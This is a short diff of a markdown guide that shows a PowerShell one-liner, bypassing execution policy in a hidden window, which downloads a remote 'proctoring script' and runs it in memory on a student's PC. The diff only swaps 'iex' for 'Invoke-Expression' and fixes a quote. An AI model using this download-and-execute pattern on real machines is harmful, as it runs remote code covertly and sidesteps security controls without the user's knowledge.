@@ -14,7 +14,7 @@ Reference materials:
 
 ## 1.1. Utilizing DownloadString and Invoke-Expression Parameters
 ```
-powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
+powershell.exe -executionpolicy bypass -w hidden "Invoke-Expression(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')"
 ```
 Executing the above allow us conduct proctoring directly in to the memory of the Student's PC.  
 This is possible because of two Powershell command 
